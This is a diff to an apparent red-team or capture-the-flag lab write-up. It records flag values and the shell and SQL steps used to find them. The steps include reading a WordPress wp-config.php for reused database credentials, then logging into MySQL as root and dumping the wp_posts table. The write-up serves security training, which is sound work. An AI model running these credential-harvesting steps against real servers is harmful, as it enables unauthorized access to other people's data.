@@ -64,8 +64,23 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
         - cd /var/www
         - grep -R flag html
           ![flag1](/images/flag1.PNG)
-  - `flag2.txt`: flag2{fc3fd58dcdad9ab23faca6e9a36e851c
+  - `flag2.txt`: flag2{fc3fd58dcdad9ab23faca6e9a36e851c}
     - **Exploit Used**
       - While connected in as michael, flag 2 was found in the website's root directory.
         - found using find / -type f -iname *flag* 2>/dev/null
+        - cat /var/www/flag2.txt
           ![flag2](/images/flag2.PNG)
+  - `flag3` : flag3{afc01ab56b50591e7dccf93122770cd2}
+    - **Exploit Used**
+      - The wordpress configuration files contained the same login and password info that is still in use. 
+        - cat /var/www/html/wordpress/wp-config.php
+          ![wp-config credentials](/images/mysql-logins.PNG)
+      - Using those, we could log into MySQL as root.
+        - mysql -u root -p
+          ![Into MySQL](/images/mysql-in.PNG)
+      - Flag 3 was located in the wp_posts table in the wordpress database.
+        - show databases;
+        - use wordpress;
+        - show tables;
+        - select * from wp_posts;
+          ![Flag3](/images/flag3.PNG)
